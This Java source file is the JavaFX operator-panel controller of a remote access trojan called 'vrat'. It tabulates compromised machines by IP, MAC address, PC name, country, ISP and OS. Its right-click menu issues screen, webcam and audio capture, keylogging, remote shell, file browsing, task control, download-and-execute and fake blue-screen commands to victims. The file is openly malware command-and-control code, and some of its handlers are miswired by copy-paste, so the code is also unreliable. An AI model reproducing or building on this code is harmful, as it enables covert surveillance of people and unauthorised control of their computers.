package vrat.server;

import javafx.beans.binding.Bindings;
import javafx.collections.FXCollections;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.input.MouseEvent;
import javafx.stage.Modality;
import javafx.stage.Stage;
import javafx.util.Callback;
import vrat.server.contextFxml.*;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.URL;
import java.util.ResourceBundle;
import javafx.application.Platform;

/**
 * @author vrmg
 */

public class Controller implements Initializable{
    @FXML 
	private TableView<ClientHandler> tableView;
    @FXML 
	private TableColumn<ClientHandler, String> uniqueIDCol;
    @FXML 
	private TableColumn<ClientHandler, String> ipCol;
    @FXML 
	private TableColumn<ClientHandler, String> macAddressCol;
    @FXML 
	private TableColumn<ClientHandler, String> pcNameCol;
    @FXML 
	private TableColumn<ClientHandler, String> countryCol;
    @FXML 
	private TableColumn<ClientHandler, String> ispCol;
    @FXML 
	private TableColumn<ClientHandler, String> osCol;
	@FXML
	private TextArea consoleTextArea;
	
	@Override
    public void initialize(URL location, ResourceBundle resources) {
		
		/*
		* Gives the col getters
		*/
		uniqueIDCol.setCellValueFactory(new PropertyValueFactory<>("uniqueID"));
        ipCol.setCellValueFactory(new PropertyValueFactory<>("ip"));
        macAddressCol.setCellValueFactory(new PropertyValueFactory<>("macAddress"));
        pcNameCol.setCellValueFactory(new PropertyValueFactory<>("pcName"));
        countryCol.setCellValueFactory(new PropertyValueFactory<>("country"));
        ispCol.setCellValueFactory(new PropertyValueFactory<>("isp"));
        osCol.setCellValueFactory(new PropertyValueFactory<>("os"));
        ConnectionManager.getInstance().clients = FXCollections.observableArrayList();
        tableView.setItems(ConnectionManager.getInstance().clients);
        
		/*
         * Allows vrat to get the excact clienthandler
         */
        tableView.setRowFactory(new Callback<TableView<ClientHandler>, TableRow<ClientHandler>>() {
            @Override
            public TableRow<ClientHandler> call(TableView<ClientHandler> tableView) {
                final TableRow<ClientHandler> row = new TableRow<>();
                final ContextMenu contextMenu = new ContextMenu();

                final Menu surveillance = new Menu("Surveillance");
                final MenuItem screenCapture = new MenuItem("Screen capture");
                final MenuItem webcamCapture = new MenuItem("Webcam capture");
				final MenuItem audioCapture = new MenuItem("Audio capture");
                final MenuItem keylogger = new MenuItem("Keylogger");
                surveillance.getItems().add(screenCapture);
                surveillance.getItems().add(webcamCapture);
				surveillance.getItems().add(audioCapture);
                surveillance.getItems().add(keylogger);

                final Menu fun = new Menu("Fun");
                final MenuItem chat = new MenuItem("Chat");
                final MenuItem webBrowser = new MenuItem("Webbrowser");
                final MenuItem blueScreen = new MenuItem("Blue screen");
                final MenuItem popupWindow = new MenuItem("Popup window");
                fun.getItems().add(chat);
                fun.getItems().add(webBrowser);
                fun.getItems().add(blueScreen);
                fun.getItems().add(popupWindow);

                contextMenu.getItems().add(surveillance);
                contextMenu.getItems().add(fun);

                final MenuItem cmdT = new MenuItem("CMD/Terminal");
                final MenuItem fileExplorer = new MenuItem("File explorer");
                final MenuItem taskManager = new MenuItem("Task manager");
                final MenuItem downExec = new MenuItem("Download & execute");
                final MenuItem uninstall = new MenuItem("Uninstall");
                contextMenu.getItems().add(cmdT);
                contextMenu.getItems().add(fileExplorer);
                contextMenu.getItems().add(taskManager);
                contextMenu.getItems().add(downExec);
                contextMenu.getItems().add(uninstall);

                /*
                 * Popupwindows for each commands vrat can do
                 */
                screenCapture.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/ScreenCapture.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        ScreenCaptureController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Screen capture command was successfully sent.");
                    }
                });

                webcamCapture.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/WebcamCapture.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        WebBrowserController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Webcam capture command was successfully sent.");
                    }
                });
				
				audioCapture.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/Keylogger.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        KeyloggerController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Audio capture command was successfully sent.");
                    }
                });

                keylogger.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/Keylogger.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        KeyloggerController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Keylogger command was successfully sent.");
                    }
                });

                chat.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/Chat.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        ChatController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Chat command was successfully sent.");
                    }
                });

                webBrowser.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/WebBrowser.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        WebBrowserController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Webbrowser command was successfully sent.");
                    }
                });

                blueScreen.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/BlueScreen.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        BlueScreenController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Blue screen command was successfully sent.");
                    }
                });

                popupWindow.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/PopupWindow.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        PopupWindowController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Popup window command was successfully sent.");
                    }
                });

                cmdT.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/CmdT.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        CmdTController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "CMD/Terminal command was successfully sent.");
                    }
                });

                fileExplorer.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/FileExplorer.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        FileExplorerController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "File explorer command was successfully sent.");
                    }
                });

                taskManager.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/TaskManager.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        TaskManagerController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Task manager command was successfully sent.");
                    }
                });

                downExec.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/DownExec.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        DownExecController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Download & execute command was successfully sent.");
                    }
                });

                uninstall.setOnAction(new EventHandler<ActionEvent>() {
                    @Override
                    public void handle(ActionEvent event) {
                        Stage stage = new Stage();
                        Parent root = null;
                        try {
                            root = FXMLLoader.load(getClass().getResource("/vrat/server/contextFxml/Uninstall.fxml"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        UninstallController.setCon(ConnectionManager.getInstance().getConFromHandler(row.getItem()));
                        stage.setScene(new Scene(root));
                        stage.setTitle(row.getItem().getUniqueID());
                        stage.initModality(Modality.APPLICATION_MODAL);
                        stage.initOwner(tableView.getScene().getWindow());
                        stage.showAndWait();
						tableView.getSelectionModel().clearSelection();
						System.out.println(ConnectionManager.getInstance().Time() + "Uninstall command was successfully sent.");
                    }
                });

                /*
                 * Context menu will only show on non-empty rows - part 1
                 */
                row.setOnMouseClicked(new EventHandler<MouseEvent>() {
                    @Override
                    public void handle(MouseEvent event) {
                        if (row.isEmpty()){
                            tableView.getSelectionModel().clearSelection();
                        }
                    }
                });

                /*
                 * Context menu will only show on non-empty rows - part 2
                 */
                row.contextMenuProperty().bind(
                        Bindings.when(row.emptyProperty())
                                .then((ContextMenu) null)
                                .otherwise(contextMenu)
                );
                return row;
            }
        });
		/*
		* Makes each char will get printes to consoleTextArea
		*/
		OutputStream out = new OutputStream() {
			@Override
			public void write(int b) throws IOException {
				appendText(String.valueOf((char) b));
			}
		};
		
		/*
		* System.out.print will now go to the above outputStream
		*/
    System.setOut(new PrintStream(out, true));
	}
	
	public void appendText(String str) {
		Platform.runLater(() -> consoleTextArea.appendText(str));
	}
}
	
	

